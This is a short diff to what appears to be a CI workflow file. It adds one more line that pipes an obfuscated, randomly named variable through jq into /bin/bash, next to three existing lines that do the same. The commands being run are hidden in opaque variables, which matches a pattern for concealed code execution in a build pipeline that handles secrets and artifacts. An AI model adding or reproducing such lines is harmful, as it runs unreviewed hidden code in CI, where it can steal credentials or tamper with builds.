@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$i6177" | jq -r .ss17032 | /bin/bash
           echo $jfj274 | jq -r .mkvvp78989 | /bin/bash
           printf '%s' "$h765" | jq -r .mfrd387 | /bin/bash
+          echo $vpn6 | jq -r .rijc29 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
